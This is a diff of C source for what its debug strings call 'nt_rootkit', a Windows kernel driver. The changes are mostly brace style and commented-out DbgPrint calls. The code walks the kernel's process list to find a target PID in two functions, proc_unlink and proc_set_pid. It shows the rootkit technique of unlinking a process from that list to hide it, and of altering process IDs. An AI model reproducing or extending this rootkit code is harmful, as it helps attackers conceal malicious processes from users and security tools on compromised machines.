@@ -2,10 +2,8 @@
 
 NTSTATUS proc_unlink(UINT32 pid) {
         if (!pid)
-        {
-                DbgPrint("Invalid PID!");
                 return STATUS_SUCCESS;
-        }
+        //DbgPrint("Invalid PID!");
 
         PEPROCESS curr_proc = PsGetCurrentProcess();
 
@@ -14,8 +12,7 @@ NTSTATUS proc_unlink(UINT32 pid) {
         PLIST_ENTRY curr_flink = NULL;
         PLIST_ENTRY curr_blink = curr_entry->Blink;
 
-        while (curr_entry != curr_blink)
-        {
+        while (curr_entry != curr_blink) {
                 curr_flink = curr_entry->Flink;
                 PUINT32 curr_pid = (PUINT32)(((ULONG_PTR)curr_entry -
                         PROC_LINKS_OFFSET) + PID_OFFSET);
@@ -23,8 +20,7 @@ NTSTATUS proc_unlink(UINT32 pid) {
                 //DbgPrint("nt_rootkit: target: %d", pid);
                 //DbgPrint("nt_rootkit: curr_pid: %d", *curr_pid);
 
-                if (*curr_pid == pid)
-                {
+                if (*curr_pid == pid) {
                         //DbgPrint("nt_rootkit: FOUND MATCHING PID");
 
                         if (MmIsAddressValid(curr_entry))
@@ -40,10 +36,8 @@ NTSTATUS proc_unlink(UINT32 pid) {
 
 NTSTATUS proc_set_pid(UINT32 pid) {
         if (!pid)
-        {
-                DbgPrint("Invalid PID!");
                 return STATUS_SUCCESS;
-        }
+        //DbgPrint("Invalid PID!");
 
         PEPROCESS curr_proc = PsGetCurrentProcess();
 
@@ -52,8 +46,7 @@ NTSTATUS proc_set_pid(UINT32 pid) {
         PLIST_ENTRY curr_flink = NULL;
         PLIST_ENTRY curr_blink = curr_entry->Blink;
 
-        while (curr_entry != curr_blink)
-        {
+        while (curr_entry != curr_blink) {
                 curr_flink = curr_entry->Flink;
                 PUINT32 curr_pid = (PUINT32)(((ULONG_PTR)curr_entry -
                         PROC_LINKS_OFFSET) + PID_OFFSET);
@@ -61,8 +54,7 @@ NTSTATUS proc_set_pid(UINT32 pid) {
                 //DbgPrint("nt_rootkit: target: %d", pid);
                 //DbgPrint("nt_rootkit: curr_pid: %d", *curr_pid);
 
-                if (*curr_pid == pid)
-                {
+                if (*curr_pid == pid) {
                         //DbgPrint("nt_rootkit: FOUND MATCHING PID");
 
                         if (MmIsAddressValid(curr_entry))
